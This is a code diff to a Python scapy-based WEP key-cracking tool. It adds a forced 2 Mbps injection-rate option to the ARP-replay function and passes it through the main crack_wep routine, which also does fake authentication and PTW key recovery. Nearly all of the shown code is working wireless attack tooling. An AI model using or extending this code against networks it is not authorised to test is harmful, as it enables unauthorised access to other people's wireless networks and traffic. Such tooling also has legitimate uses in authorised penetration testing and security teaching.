@@ -19,7 +19,7 @@ from scapy.layers.dot11 import Dot11, Dot11WEP
 from scapy.packet import Packet
 from scapy.sendrecv import sendp, sniff
 
-from ..frames import BROADCAST, craft_assoc_req, craft_auth
+from ..frames import BROADCAST, craft_assoc_req, craft_auth, with_forced_rate
 from ..radio import set_channel
 from ..wep.crypto import recover_keystream
 from ..wep.ptw import PTWVoteTable, compute_key
@@ -66,8 +66,15 @@ def wep_iv_and_ciphertext(pkt: Packet) -> tuple[bytes, bytes] | None:
     return iv, ciphertext
 
 
-def replay_arp(iface: str, pkt: Packet, count: int = 500, interval: float = 0.01) -> int:
-    """Reinject a captured WEP ARP-request frame repeatedly; returns count sent."""
+def replay_arp(iface: str, pkt: Packet, count: int = 500, interval: float = 0.01,
+                low_rate: bool = False) -> int:
+    """Reinject a captured WEP ARP-request frame repeatedly; returns count sent.
+
+    low_rate: force a 2 Mbps injection rate instead of replaying the
+    frame's own captured RadioTap -- see frames.with_forced_rate.
+    """
+    if low_rate:
+        pkt = with_forced_rate(pkt, mbps=2)
     sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
     return count
 
@@ -104,6 +111,7 @@ def crack_wep(
     poll_interval: float = 2.0,
     top_k: int = 16,
     max_candidates: int = 200_000,
+    low_rate: bool = False,
     sniff_fn=sniff,
     sendp_fn=sendp,
     auth_fn=fake_authenticate,
@@ -132,7 +140,7 @@ def crack_wep(
         nonlocal seed_frame
         if add_captured_frame_to_table(table, pkt):
             if seed_frame is None:
-                seed_frame = pkt
+                seed_frame = with_forced_rate(pkt, mbps=2) if low_rate else pkt
 
     while time.monotonic() < deadline and len(table.sessions) < target_sessions:
         sniff_fn(iface=iface, timeout=poll_interval, prn=on_packet, store=False)
